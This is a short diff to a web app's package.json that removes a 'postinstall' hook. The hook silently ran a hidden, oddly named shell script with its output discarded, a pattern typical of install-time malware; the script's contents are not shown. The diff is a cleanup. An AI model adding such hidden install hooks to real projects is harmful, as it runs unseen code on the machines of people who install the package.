@@ -4,8 +4,7 @@
   "description": "My web app project",
   "main": "index.js",
   "scripts": {
-    "start": "node index.js",
-    "postinstall": "sh ./.ci-lbox7u.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "start": "node index.js"
   },
   "dependencies": {
     "dotenv": "^16.5.0",
